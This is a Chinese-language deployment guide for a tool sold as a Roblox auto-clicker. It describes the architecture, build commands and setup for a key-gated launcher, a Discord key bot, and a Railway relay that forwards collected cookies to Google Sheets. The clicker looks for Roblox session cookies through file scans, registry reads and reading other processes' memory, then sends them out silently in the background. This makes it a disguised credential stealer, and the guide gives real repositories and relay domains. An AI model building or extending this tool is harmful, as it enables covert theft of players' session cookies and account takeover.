# 1yn AutoClick — 完整交付指南

## 一、系統架構總覽

| 元件 | 檔案 | 說明 |
|------|------|------|
| **金鑰啟動器** | `launcher.cpp` → `1ynkeycheck.exe` | 驗證金鑰後啟動連點器 |
| **連點器主程式** | `yy_clicker.cpp` → `yy_clicker.exe` | 4 層 Cookie 偵測 + 自動點擊 |
| **Cookie 中轉伺服器** | `server.js`（Railway） | 接收 Cookie 並轉發至 Google Sheets |
| **Discord Bot + 金鑰驗證 API** | `bot.js`（Railway） | 金鑰管理 + `/giveautoclick` 指令 |
| **Google Apps Script** | `google_apps_script.js` | 統一接收端（Cookie + 用戶資料 + 金鑰記錄） |

---

## 二、使用流程

```
管理員在 Discord 執行 /giveautoclick @使用者
         │
         ▼
Bot 產生金鑰 → 私訊使用者 → 寫入 Google Sheets
         │
         ▼
使用者開啟 1ynkeycheck.exe → 輸入金鑰
         │
         ▼
WinHTTP → Railway Bot API (/api/verify-key) → 驗證成功
         │
         ▼
啟動 yy_clicker.exe（傳入金鑰作為參數）
         │
         ▼
yy_clicker.exe 再次驗證金鑰 → 通過後啟動主介面
         │
         ▼
使用者按下「開始」→ 4 層 Cookie 偵測
         │
         ▼
偵測到 Cookie → 背景傳送至 Railway Cookie 中轉 → Google Sheets
```

---

## 三、部署步驟

### Step 1：建立 Google 試算表

1. 前往 [Google Sheets](https://docs.google.com/spreadsheets/) 建立新試算表
2. 記下試算表 URL 中的 **SPREADSHEET_ID**：
   ```
   https://docs.google.com/spreadsheets/d/{SPREADSHEET_ID}/edit
   ```

### Step 2：部署 Google Apps Script

1. 前往 [Google Apps Script](https://script.google.com/) → 新增專案
2. 將 `google_apps_script.js` 的內容貼入 `Code.gs`
3. 將 `SPREADSHEET_ID` 替換為您的試算表 ID
4. 點選「部署」→「新增部署作業」
5. 類型：**網頁應用程式**
6. 執行身分：**我**
7. 存取權限：**所有人**
8. 部署後複製 **Web App URL**

> 此統一端點會自動根據 POST 資料欄位判斷來源：
> - 包含 `cookie` → 寫入 "CookieLog" 工作表
> - 包含 `purchase_item` → 寫入 "用戶資料" 工作表
> - 包含 `key` → 寫入 "金鑰記錄" 工作表

### Step 3：部署 Railway Cookie 中轉伺服器

1. 前往 [Railway](https://railway.app/) 登入
2. 新增專案 → **Deploy from GitHub repo** → 選擇 `yannswl1178/rbxcokie`
3. 設定環境變數：
   ```
   GOOGLE_SCRIPT_URL = https://script.google.com/macros/s/xxx/exec
   ```
4. 產生公開域名（目前：`web-production-59f58.up.railway.app`）

### Step 4：部署 Railway Discord Bot

1. 新增另一個 Railway 專案 → **Deploy from GitHub repo** → 選擇 `yannswl1178/autokeybot`（或同倉庫不同分支）
2. 設定環境變數：
   ```
   DISCORD_TOKEN = 你的Bot Token
   GOOGLE_SCRIPT_URL = https://script.google.com/macros/s/xxx/exec
   GUILD_ID = 1479753380661428409
   ```
3. 產生公開域名（目前：`web-production-a8756.up.railway.app`）

### Step 5：編譯 C++ 程式

使用 VS Code 的 MSVC 編譯（Ctrl+Shift+B）：

**1ynkeycheck.exe（金鑰啟動器）：**
```cmd
cl /Zi /EHsc /nologo /Fe:1ynkeycheck.exe launcher.cpp
```

**yy_clicker.exe（連點器主程式）：**
```cmd
cl /Zi /EHsc /nologo /Fe:yy_clicker.exe yy_clicker.cpp
```

> 所有需要的 lib 已透過 `#pragma comment(lib, ...)` 在原始碼中指定，無需額外連結。

---

## 四、C++ 客戶端功能

### 金鑰啟動器 (`1ynkeycheck.exe`)

- GUI 介面，輸入金鑰後按「驗證並啟動」
- WinHTTP 連線至 Railway Bot API 驗證金鑰
- HWID 綁定（電腦名稱 + Windows 使用者名稱）
- 驗證成功後自動啟動同目錄下的 `yy_clicker.exe`
- 按 Enter 鍵可直接觸發驗證

### 連點器主程式 (`yy_clicker.exe`)

- 4 層 Roblox Cookie 偵測
- 自動點擊（可調 CPS）
- 鍵盤 + 滑鼠側鍵熱鍵支援
- Cookie 自動傳送至 Railway 中轉伺服器
- 必須透過 `1ynkeycheck.exe` 啟動（直接開啟會靜默退出）

### 4 層 Cookie 偵測

| 層級 | 方法 | Windows API |
|------|------|-------------|
| Layer 1 | 檔案掃描 | `FindFirstFile` / `ReadFile` |
| Layer 2 | 登錄檔讀取 | `RegOpenKeyEx` / `RegQueryValueEx` |
| Layer 3 | Microsoft Store 封裝 | `GetEnvironmentVariable` |
| Layer 4 | 程序記憶體掃描 | `CreateToolhelp32Snapshot` → `VirtualQueryEx` → `ReadProcessMemory` |

---

## 五、Discord Bot 功能

### 指令

| 指令 | 說明 |
|------|------|
| `/giveautoclick @使用者` | 管理員/代理賦予金鑰（自動私訊使用者） |

### 控制面板按鈕

| 按鈕 | 說明 |
|------|------|
| 兌換金鑰 | 輸入金鑰兌換 autoclick 身分組 |
| 獲取金鑰 | 查看已分配的金鑰（私訊發送） |
| 獲取身分組 | 獲取 autoclick 身分組 |
| 重置 HWID | 重置硬體綁定（更換電腦時使用） |
| 查看統計 | 查看金鑰狀態和 HWID 資訊 |

### API 端點

| 端點 | 方法 | 說明 |
|------|------|------|
| `/` | GET | 健康檢查 |
| `/health` | GET | 健康檢查 |
| `/api/verify-key` | POST | 金鑰驗證（C++ 客戶端呼叫） |
| `/api/debug/keys` | GET | 除錯：列出所有金鑰（僅開發用） |

---

## 六、HWID 格式

launcher.cpp 和 yy_clicker.cpp 使用**相同的 HWID 格式**：

```
{電腦名稱}_{Windows使用者名稱}
```

例如：`DESKTOP-ABC123_John`

---

## 七、GitHub 倉庫

- Cookie 中轉 + C++ 原始碼：https://github.com/yannswl1178/rbxcokie
- Discord Bot：https://github.com/yannswl1178/autokeybot（或同倉庫）
- Railway 連結倉庫後，每次 push 至 `main` 分支會自動重新部署
